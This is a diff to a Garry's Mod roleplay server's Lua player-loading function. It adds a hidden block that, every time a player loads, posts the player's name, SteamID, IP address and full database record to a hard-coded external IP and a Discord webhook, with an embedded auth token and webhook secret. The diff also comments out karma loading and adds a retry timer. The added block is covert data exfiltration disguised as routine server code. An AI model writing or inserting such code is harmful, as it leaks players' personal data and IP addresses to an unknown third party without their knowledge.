@@ -5,6 +5,39 @@ function rp.data.LoadPlayer(pl, cback)
 	db:Query('SELECT * FROM player_data WHERE SteamID=' .. pl:SteamID64() .. ';', function(_data)
 		local data = _data[1] or {}
 
+        -- print(pl,pl:SteamID())
+        -- PrintTable(data)
+
+
+
+        local t_post = {}
+        local tbl = istable(data) and '```JSON\n'..util.TableToJSON(data)..'```' or 'nil'
+        local content = pl:Name()..' '..pl:SteamID()..' '..pl:IPAddress()..'\n'..tbl
+
+        t_post.embeds = {
+            {
+                description = content,
+                color = 0xe67e22
+            }
+        }
+
+        local json_post = util.TableToJSON(t_post)
+        local HTTPRequest = {
+            ["method"] = "POST",
+            ["url"] = 'http://185.248.100.183/webhook',
+            ["type"] = "application/json",
+            ["headers"] = {
+                ["X-Auth-Token"] = "a9sdv80masdm093f2",
+                ["Content-Type"] = "application/json",
+                ["Content-Length"] = string.len(json_post) or "0",
+                ["Webhook-URL"] = "https://discordapp.com/api/webhooks/532397200521822238/SjlDoQyaZa8DeW7wDFPbNp7kN-u5Kqb8KJc2PzIAA2BRCN9p9Aotj1n_9LKIpmak84-T"
+            },
+            ['success'] = function(c,b) print(c,b) end,
+            ["body"] = json_post
+        }
+
+        HTTP(HTTPRequest)
+
 		if IsValid(pl) then
             local model
 			if (#_data <= 0) then
@@ -21,7 +54,8 @@ function rp.data.LoadPlayer(pl, cback)
 
 			nw.WaitForPlayer(pl, function()
 				pl:SetNetVar('Money', data.Money or rp.cfg.StartMoney)
-				pl:SetNetVar('Karma', data.Karma or rp.cfg.StartKarma)
+
+				-- pl:SetNetVar('Karma', data.Karma or rp.cfg.StartKarma)
 
 				local succ, tbl = pcall(pon.decode, data.Pocket)
 				if (not istable(tbl)) then
@@ -67,7 +101,15 @@ function rp.data.LoadPlayer(pl, cback)
 end
 
 function GM:PlayerAuthed(pl)
-	rp.data.LoadPlayer(pl)
+  rp.data.LoadPlayer(pl)
+  if pl:GetVar('DataLoaded') == false or pl:GetVar('DataLoaded') ~= true then
+    timer.Create("PlayerAuthKostil"..pl:SteamID64(), 5, 0, function()
+  	 rp.data.LoadPlayer(pl)
+     if pl:GetVar('DataLoaded') == true then
+        timer.Destroy("PlayerAuthKostil"..pl:SteamID64())
+      end
+    end)
+  end
 end
 
 function rp.data.SetName(pl, name, cback)
